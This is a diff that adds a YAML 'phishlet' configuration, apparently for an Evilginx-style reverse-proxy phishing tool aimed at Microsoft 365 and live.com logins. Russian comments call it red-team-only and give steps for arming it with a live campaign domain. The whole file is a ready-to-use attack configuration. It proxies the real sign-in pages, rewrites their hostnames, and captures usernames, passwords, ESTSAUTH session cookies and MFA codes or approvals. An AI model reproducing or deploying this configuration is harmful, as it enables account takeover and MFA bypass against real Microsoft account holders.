@@ -1,0 +1,51 @@
+# Microsoft 365 phishlet (Phantom v2). Только авторизованный Red Team.
+# Перед боем: base_domains -> свой домен, прогнать живой логин и сверить токены.
+# Анатомия соответствует публичным community-phishlet (loginfmt/passwd, ESTSAUTH).
+id: microsoft365
+version: 2
+base_domains:
+  - "phish.test" # REPLACE-ME: боевой домен кампании
+proxy_hosts:
+  - phish_sub: "m365"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    is_landing: true
+  - phish_sub: "live"
+    orig_sub: "login"
+    domain: "live.com"
+    is_landing: false
+sub_filters:
+  - triggers_on: "login.microsoftonline.com"
+    search: "login.microsoftonline.com"
+    replace: "m365.phish.test"
+    mime: ["text/html", "application/json"]
+    redirect_only: false
+  - triggers_on: "login.live.com"
+    search: "login.live.com"
+    replace: "live.phish.test"
+    mime: ["text/html", "application/json"]
+    redirect_only: false
+  - triggers_on: "aadcdn.msauth.net"
+    search: "aadcdn.msauth.net"
+    replace: "m365.phish.test"
+    mime: ["text/html", "text/css", "application/json", "javascript"]
+    redirect_only: false
+auth_tokens:
+  - domain: ".microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
+  - domain: ".live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
+creds_map:
+  - key: "login"
+    search: "loginfmt"
+  - key: "passwd"
+    search: "passwd"
+mfa_tokens:
+  - key: "totp"
+    search: "otc"
+  - key: "webauthn"
+    search: "authenticatorAssertionResponse"
+  - key: "push"
+    search: "Approve"
+lure_path: "/l/m365-01"
+enabled: true
